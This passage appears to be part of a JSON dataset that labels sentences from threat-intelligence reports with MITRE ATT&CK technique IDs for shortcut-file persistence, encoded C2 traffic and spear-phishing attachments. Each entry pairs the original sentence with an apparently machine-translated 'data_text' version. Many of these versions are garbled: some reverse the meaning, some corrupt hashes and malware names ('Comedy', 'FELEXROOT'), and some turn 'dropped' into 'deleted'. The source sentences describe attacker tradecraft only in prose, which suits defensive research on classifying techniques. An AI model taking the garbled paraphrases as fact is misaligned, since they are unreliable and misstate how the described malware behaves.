            "en_text": "The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo",
            "data_text": "The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo."
        }
    ],
    "Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer": [
        {
            "tec_id": "T1547.009",
            "en_text": "Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer",
            "data_text": "Clicking on the shortcut will ultimately lead to the Backdoor.Downloading and running Pirpi on the affected computer"
        }
    ],
    "Comnie is able to achieve persistence via a .lnk file that is stored within the victim’s startup path": [
        {
            "tec_id": "T1547.009",
            "en_text": "Comnie is able to achieve persistence via a .lnk file that is stored within the victim’s startup path",
            "data_text": "Comnie can achieve persistence through .lnk files stored within the victim's starting path."
        }
    ],
    "Additionally, in the event Kaspersky is detected, the malware will immediately run the ‘Conime.lnk’ shortcut file in a new process after it is created": [
        {
            "tec_id": "T1547.009",
            "en_text": "Additionally, in the event Kaspersky is detected, the malware will immediately run the ‘Conime.lnk’ shortcut file in a new process after it is created",
            "data_text": "In addition, if Kaspersky is detected, malicious code immediately executes 'Comedy'.Shortcut file 'lnk' in new process after creation"
        }
    ],
    "The script saves the decoded and decompressed executable to %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up": [
        {
            "tec_id": "T1547.009",
            "en_text": "The script saves the decoded and decompressed executable to %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up",
            "data_text": "This script stores decoded and decompressed executables in %APPDA.TA%\\Microsoft\\Windows\\Template\\Windows Template.Create LNK shortcuts in exe and %APPDA.TA%\\Microsoft\\Windows\\Start menu\\Program\\Start\\OneDrive.lnk template that runs Windows permanently.Run every time Windows starts"
        }
    ],
    "This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim": [
        {
            "tec_id": "T1547.009",
            "en_text": "This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim",
            "data_text": "In this FIN7 phishing, a hidden shortcut file (LNK file) is implemented to initiate an infection and infect the victim with the VBScript feature initiated by mshta.exe."
        }
    ],
    "In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique": [
        {
            "tec_id": "T1547.009",
            "en_text": "In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file – two versions of the same LNK file and VBScript technique",
            "data_text": "In an ongoing campaign, FIN7 targets organizations through spear phishing emails that contain malicious DOCX or RTF files, two versions of the same LNK file and VBScript technology."
        }
    ],
    "This spawns the hidden embedded malicious LNK file in the document": [
        {
            "tec_id": "T1547.009",
            "en_text": "This spawns the hidden embedded malicious LNK file in the document",
            "data_text": "Creates a built-in malicious LNK file hidden in a document."
        }
    ],
    "Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker’s development environment": [
        {
            "tec_id": "T1547.009",
            "en_text": "Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker’s development environment",
            "data_text": "Figure 3: FIN7 Phishing Incentive Persistence Mechanism Check Attacker Shortcut Files In many cases, an attacker-generated LNK file can expose sensitive information about the attacker's development environment."
        }
    ],
    "These files can be parsed with lnk-parser to extract all contents": [
        {
            "tec_id": "T1547.009",
            "en_text": "These files can be parsed with lnk-parser to extract all contents",
            "data_text": "These files can be parsed with lnk-parser to extract everything."
        }
    ],
    "LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address": [
        {
            "tec_id": "T1547.009",
            "en_text": "LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address",
            "data_text": "LNK files have been useful in Mandiant incident response investigations because they include volume serial numbers, NetB.IOS Name and MAC Address"
        }
    ],
    "If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension": [
        {
            "tec_id": "T1547.009",
            "en_text": "If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension",
            "data_text": "If this file exists, it reads the content to get the path to finding the second file with the LNK (link) extension."
        }
    ],
    "The LNK file is finally used to identify a third file: a ZIP file": [
        {
            "tec_id": "T1547.009",
            "en_text": "The LNK file is finally used to identify a third file: a ZIP file",
            "data_text": "The LNK file is finally used to identify the third file, the ZIP file."
        }
    ],
    "When it is executed, it creates two files: an LNK file that points to %system32%\\rundll32.exe, and the FELIXROOT loader component": [
        {
            "tec_id": "T1547.009",
            "en_text": "When it is executed, it creates two files: an LNK file that points to %system32%\\rundll32.exe, and the FELIXROOT loader component",
            "data_text": "When run, two files are created: the LNK file pointing to %system32%\\rundll32.exe and the FELEXROOT loader component."
        }
    ],
    "The LNK file is moved to the startup directory": [
        {
            "tec_id": "T1547.009",
            "en_text": "The LNK file is moved to the startup directory",
            "data_text": "The LNK file is moved to the starting directory."
        }
    ],
    "This file is then copied to a filename of ‘Windows Update.lnk’, which is placed in the startup path previously identified": [
        {
            "tec_id": "T1547.009",
            "en_text": "This file is then copied to a filename of ‘Windows Update.lnk’, which is placed in the startup path previously identified",
            "data_text": "This file is then copied to the file name of 'Windows Update'.lnk' placed in the previously identified starting path"
        }
    ],
    "This shortcut file points to the path of the previously written ‘Applet.cpl’ file": [
        {
            "tec_id": "T1547.009",
            "en_text": "This shortcut file points to the path of the previously written ‘Applet.cpl’ file",
            "data_text": "This shortcut file points to the path of the previously created 'Applet.cpl' file."
        }
    ],
    "Finally, Reaver.v1 will execute the ‘~WUpdate.lnk’ file in a new process, thus loading the recently dropped malicious CPL file": [
        {
            "tec_id": "T1547.009",
            "en_text": "Finally, Reaver.v1 will execute the ‘~WUpdate.lnk’ file in a new process, thus loading the recently dropped malicious CPL file",
            "data_text": "Finally, Reaver.v1 will run the '~WU update.Send the 'lnk' file to the new process to load the recently deleted malicious CPL file."
        }
    ],
    "This shortcut file points to the path of the previously written ‘winhelp.cpl’ file": [
        {
            "tec_id": "T1547.009",
            "en_text": "This shortcut file points to the path of the previously written ‘winhelp.cpl’ file",
            "data_text": "This shortcut file points to the path to the previously created 'winhelp.cpl' file."
        }
    ],
    "Finally, Reaver.v2 will execute the ‘~Update.lnk’ file in a new process, thus loading the recently dropped malicious CPL file": [
        {
            "tec_id": "T1547.009",
            "en_text": "Finally, Reaver.v2 will execute the ‘~Update.lnk’ file in a new process, thus loading the recently dropped malicious CPL file",
            "data_text": "Finally, run '~Update' on Reaver.v2.Send the 'lnk' file to the new process to load the recently deleted malicious CPL file."
        }
    ],
    "This shortcut file calls the built-in ‘control.exe’ utility to in turn load the previously dropped malicious CPL file of ‘winhelp.cpl’": [
        {
            "tec_id": "T1547.009",
            "en_text": "This shortcut file calls the built-in ‘control.exe’ utility to in turn load the previously dropped malicious CPL file of ‘winhelp.cpl’",
            "data_text": "This shortcut file invokes built-in 'control'.Load 'winhelp.cpl', a malicious CPL file that was previously deleted using the 'exe' utility."
        }
    ],
    "In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file": [
        {
            "tec_id": "T1547.009",
            "en_text": "In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file",
            "data_text": "In this campaign, the Kopi Luwak backdoor was encoded and delivered as a Windows shortcut (.lnk) file."
        }
    ],
    "The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier": [
        {
            "tec_id": "T1547.009",
            "en_text": "The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier",
            "data_text": "The lnk file was a particularly interesting development because the powershell code contained to decode and drop the payload is almost identical to that used by the Zebrocy threat actor a month ago."
        }
    ],
    "Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence": [
        {
            "tec_id": "T1547.009",
            "en_text": "Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence",
            "data_text": "Invoke the Windows scripting host (wscript.exe) from the Start folder to use a Windows shortcut file (.lnk) that runs the Jscript backdoor for persistence"
        }
    ],
    "When the Trojan runs as an executable within the “DsvHelper” folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the ‘DsvHelper’ folder": [
        {
            "tec_id": "T1547.009",
            "en_text": "When the Trojan runs as an executable within the “DsvHelper” folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the ‘DsvHelper’ folder",
            "data_text": "When the Trojan horse runs as an executable within the \"DsvHelper\" folder, it creates a shortcut (.lnk file) and stores the shortcut in the \"DsvHelper\" folder."
        }
    ],
    "2 Successful payload download Astaroth’s initial payload is a malicious .lnk file, a common delivery method used by threat actors": [
        {
            "tec_id": "T1547.009",
            "en_text": "2 Successful payload download Astaroth’s initial payload is a malicious .lnk file, a common delivery method used by threat actors",
            "data_text": "2 Successful payload download The initial payload of Astaroth is a malicious .lnk file and is a common transport method used by threat actors."
        }
    ],
    "Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload": [
        {
            "tec_id": "T1547.009",
            "en_text": "Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload",
            "data_text": "The malicious .lnk file contains a link to the URL (instead of the expected local URI) to get the next payload."
        }
    ],
    "In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk": [
        {
            "tec_id": "T1547.009",
            "en_text": "In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk",
            "data_text": "For Astaroth Trojan horses, the .lnk file contains arguments for WMIC.exe, which opens a window that the victim will notice and does not download hardcoded url from .lnk."
        }
    ],
    "The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous": [
        {
            "tec_id": "T1132",
            "en_text": "The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous",
            "data_text": "This strategy also serves to mask malicious C2 and spill traffic and make it look harmless."
        }
    ],
    "Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server": [
        {
            "tec_id": "T1132",
            "en_text": "Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server",
            "data_text": "Encoded Payload Decoded MD5 Size Import Hash Export Feature Version aa3f303c3319b14b4829fe2fa5999c1 3322164 182ee99b4f0803628c30411fa99999l7MF25T96n45QOGWX 5.32128D84c4c194c193c194c193c194c193c193c194c193143143c194c193c193c193c193174134c193c193c193c193c194134If not, the cookie header sends an error code."
        }
    ],
    "Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication": [
        {
            "tec_id": "T1132",
            "en_text": "Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication",
            "data_text": "Another difference between network traffic generated by malware is that the encoded proxy information was added to the URL query value during C2 communication."
        }
    ],
    "The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform": [
        {
            "tec_id": "T1132",
            "en_text": "The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform",
            "data_text": "Communication and leakage of data was detected in real-world scenarios using the Cybreason platform."
        }
    ],
    "The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload": [
        {
            "tec_id": "T1132",
            "en_text": "The encoded payload is then made to look like a URI by having a random number of ‘/’ characters inserted at random locations within the encoded payload",
            "data_text": "The encoded payload then looks like a URI by inserting any number of '/' characters in any location within the encoded payload."
        }
    ],
    "McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access": [
        {
            "tec_id": "T1132",
            "en_text": "McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access",
            "data_text": "McAfee ATR has found additional inserts that are currently part of its work to achieve continuous data leakage and persistence for target access."
        }
    ],
    "The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:  Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h  Malware checking to make sure a received command is in the correct range": [
        {
            "tec_id": "T1132",
            "en_text": "The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:  Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h  Malware checking to make sure a received command is in the correct range",
            "data_text": "Optional HTTP data with king.jpg looks like a beacon informing the control server that the malware is ready to accept the new command: the command received from the control server is an encoded DWORD. After decoding, these DWORDs must be in the range between 123459h and 123490h. Malware that verifies that the received command is in the correct range."
        }
    ],
    "If the size is 7 bytes or more, the backdoor verifies that the command and control server sent an encoded package": [
        {
            "tec_id": "T1132",
            "en_text": "If the size is 7 bytes or more, the backdoor verifies that the command and control server sent an encoded package",
            "data_text": "If the size is more than 7 bytes, the backdoor verifies that the command and control server have sent the encoded package."
        }
    ],
    "The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request": [
        {
            "tec_id": "T1132",
            "en_text": "The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request",
            "data_text": "The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request."
        }
    ],
    "The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order": [
        {
            "tec_id": "T1132",
            "en_text": "The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order",
            "data_text": "Drop It Trojan, which we analyzed, is an executable that decodes the built-in blob of base64 encoded data and connects it in the correct order to build the built-in executable."
        }
    ],
    "It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick “mpk”": [
        {
            "tec_id": "T1132",
            "en_text": "It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick “mpk”",
            "data_text": "It then sends an IRC command. NIC bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxp bxphjbxp The Trojan checks for messages from the IRC server after bot connection. The MPK bot that initiates the MpkNet IRC network does not subscribe to a specific IRC channel and instead sends a personal message (PRIVMSG) to a user nicknamed \"mpk\"."
        }
    ],
    "In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)": [
        {
            "tec_id": "T1132",
            "en_text": "In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)",
            "data_text": "To this request, the C2 server responds with a Base64 encoded RSA public key (see Figure 12)."
        }
    ],
    "Data that is sent is compressed and then base64-encoded before being included in the requests": [
        {
            "tec_id": "T1132",
            "en_text": "Data that is sent is compressed and then base64-encoded before being included in the requests",
            "data_text": "The transmitted data is compressed before being included in the request and then encoded as base64."
        }
    ],
    "The C2 server sends back Base64 encoded response": [
        {
            "tec_id": "T1132",
            "en_text": "The C2 server sends back Base64 encoded response",
            "data_text": "The C2 server returns a Base64 encoded response."
        }
    ],
    "The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:   <domain>\\<username>:pass   The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)": [
        {
            "tec_id": "T1132",
            "en_text": "The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format:   <domain>\\<username>:pass   The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)",
            "data_text": "The script collects system-specific data, such as the domain to which the system belongs and the current user name, and generates it in the following format:The string above <domain>\\<pass> is encoded using a custom base64 encoder to remove non-character (=, /, and +) from the data and replace it with a domain safe value.01, 02 and 03) respectively"
        }
    ],
    "A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration": [
        {
            "tec_id": "T1132",
            "en_text": "A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration",
            "data_text": "A notable feature of CopyKitens is the use of DNS for command and control communication."
        }
    ],
    "Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories": [
        {
            "tec_id": "T1132",
            "en_text": "Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories",
            "data_text": "Note: CTU researchers often observe threat actors, renaming archive tools, and storing data in unusual directories"
        }
    ],
    "This encoded information then gets an additional header added and sent across the network.": [
        {
            "tec_id": "T1132",
            "en_text": "This encoded information then gets an additional header added and sent across the network.",
            "data_text": "This encoded information is then sent over the network with additional headers."
        }
    ],
    "Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file.": [
        {
            "tec_id": "T1132",
            "en_text": "Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file.",
            "data_text": "Once host-based enumeration information is obtained, it is encoded as base64 and then added as C2 to the URL publishing request."
        }
    ],
    "Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails": [
        {
            "tec_id": "T1566.001",
            "en_text": "Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails",
            "data_text": "Attack Overview An attack begins with a Microsoft Word document that contains a malicious VBA macro attached to a spear phishing email."
        }
    ],
    "The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.  APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July": [
        {
            "tec_id": "T1566.001",
            "en_text": "The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.  APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July",
            "data_text": "The actor used several notable techniques in these events, such as sniffing passwords on Wi-Fi traffic and poisoning NetB.It is an IOS name service, which is spread laterally through the Eternal Blue exploit. Aiming at the service industry using APT28 malicious documents, FireEye found malicious documents sent to several companies in the service industry in early July, including hotels in at least seven European and one Middle Eastern country."
        }
    ],
    "Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection": [
        {
            "tec_id": "T1566.001",
            "en_text": "Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection",
            "data_text": "Initial Damage: For initial damage, FireEye Intelligence found that APT39 typically causes POWBAT infections by leveraging spear phishing emails with malicious attachments and/or hyperlinks."
        }
    ],
    "Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload": [
        {
            "tec_id": "T1566.001",
            "en_text": "Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload",
            "data_text": "How to Send Malware In all emails sent to these officials, the actor used the same attachment as a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to delete malicious payloads."
        }
    ],
    "Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past": [
        {
            "tec_id": "T1566.001",
            "en_text": "Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past",
            "data_text": "Figure 1: Reviewing the email header data in the Spear Phishing message showed that threatening agents sent emails using the same infrastructure they had used in the past."
        }
    ],
    "In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment": [
        {
            "tec_id": "T1566.001",
            "en_text": "In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment",
            "data_text": "At least in some of these recent attacks, Buckeye used a spear phishing email with malicious .zip attachments."
        }
    ],
    "Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station   Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document": [
        {
            "tec_id": "T1566.001",
            "en_text": "Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station   Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document",
            "data_text": "Looking at previous attacks between 2013 and 2016, I think Comnie was also used for targeted attacks on individuals or organizations, such as: A malicious macro document used to deliver an e-mail Comnie to a malicious macrojournalist from a Taiwanese government IT service provider in Asia, Figure 6, will initially hide the contents and ask users to use the macro before viewing it."
        }
    ],
    "APT32 actors continue to deliver the malicious attachments via spear-phishing emails": [
        {
            "tec_id": "T1566.001",
            "en_text": "APT32 actors continue to deliver the malicious attachments via spear-phishing emails",
            "data_text": "APT32 actors continue to deliver malicious attachments via Spear Phishing email."
        }
    ],
    "The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the “attachedTemplate” technique to load a template from a remote server": [
        {
            "tec_id": "T1566.001",
            "en_text": "The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the “attachedTemplate” technique to load a template from a remote server",
            "data_text": "The credential collection attack used a spear phishing email containing malicious Microsoft Office documents loading templates from remote servers using \"attached template\" technology."
        }
    ],
    "The attack involved a spear-phishing email with a subject of “Project Offer” and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment": [
        {
            "tec_id": "T1566.001",
            "en_text": "The attack involved a spear-phishing email with a subject of “Project Offer” and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment",
            "data_text": "The attack included a spear phishing email titled \"Project Offer\" and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as attachments."
        }
    ],
    "Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158": [
        {
            "tec_id": "T1566.001",
            "en_text": "Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158",
            "data_text": "A malicious Microsoft Word document (MD5: f6ffb7c30b1114befc93f39d0698560) was attached to this email that exploited CVE-2012-0158."
        }
    ],
    "Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations": [
        {
            "tec_id": "T1566.001",
            "en_text": "Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations",
            "data_text": "As with past attacks, the initial infection vector is a malicious Word document attached to phishing emails and is well tailored to target business and day-to-day-to-day operations."
        }
    ],
    "Phishing emails with political themes were used in the majority of the observed attack emails": [
        {
            "tec_id": "T1566.001",
            "en_text": "Phishing emails with political themes were used in the majority of the observed attack emails",
            "data_text": "Phishing emails with political themes were used in most of the attack emails observed."
        }
    ],
    "In order to meet the phishing emails’ infrastructure requirements, disposable domains and emails were used as the delivery medium": [
        {
            "tec_id": "T1566.001",
            "en_text": "In order to meet the phishing emails’ infrastructure requirements, disposable domains and emails were used as the delivery medium",
            "data_text": "To meet the infrastructure requirements of phishing emails, disposable domains and emails were used as delivery media."
        }
    ],
    "Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document": [
        {
            "tec_id": "T1566.001",
            "en_text": "Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document",
            "data_text": "According to our analysis, financial institutions in Turkey have been targeted by spear phishing emails containing malicious Microsoft Word documents."
        }
    ],
    "Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016": [
        {
            "tec_id": "T1566.001",
            "en_text": "Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016",
            "data_text": "Figure 2: APT33 Malicious .hta File Excerpt APT33 sent hundreds of spear phishing emails to target individuals in 2016 using a phishing module built into the publicly available ALFA Team Shell (also known as ALFASHEL)."
        }
    ],
    "The spear phishing emails and attached malicious macro documents typically have geopolitical themes": [
        {
            "tec_id": "T1566.001",
            "en_text": "The spear phishing emails and attached malicious macro documents typically have geopolitical themes",
            "data_text": "Spear phishing emails and attached malicious macro documents typically have geopolitical themes."
        }
    ],
    "The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite": [
        {
            "tec_id": "T1566.001",
            "en_text": "The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite",
            "data_text": "The attacker used a combination of Spear Phishing e-mail and malicious HWP documents created using Hancom's Korean office suite."
        }
    ],
    "We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)": [
        {
            "tec_id": "T1566.001",
            "en_text": "We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)",
            "data_text": "We suspect that the attacker tried to evoke sympathy by reminding readers that Munchon and Gangwon Province to which it belongs were part of a unified province that included Korea's Gangwon Province before the 1945 division.The second email contained a story about a person named 'Ewing Kim' who was asking for help.The attachments in the email are two different HWP documents, both exploiting the same vulnerability (CVE-2013-0808)."
        }
    ],
    "This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments": [
        {
            "tec_id": "T1566.001",
            "en_text": "This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments",
            "data_text": "The campaign began with a handful of spear phishing emails and malicious attachments to Korean audiences."
        }
    ],
    "MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros": [
        {
            "tec_id": "T1566.001",
            "en_text": "MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros",
            "data_text": "MAGIC HOUND TOOLSET MAGIC Hound attacks rely on executable files and Microsoft Office documents, especially Excel and Word documents containing malicious macros, without relying on exploit codes to compromise the target system."
        }
    ],
    "The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”": [
        {
            "tec_id": "T1566.001",
            "en_text": "The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”",
            "data_text": "The email is accompanied by a malicious Excel macro document, which, when executed, creates a new Microsoft Visual Basic (VB) script-based malware family and is named \"BabyShark\"."
        }
    ],
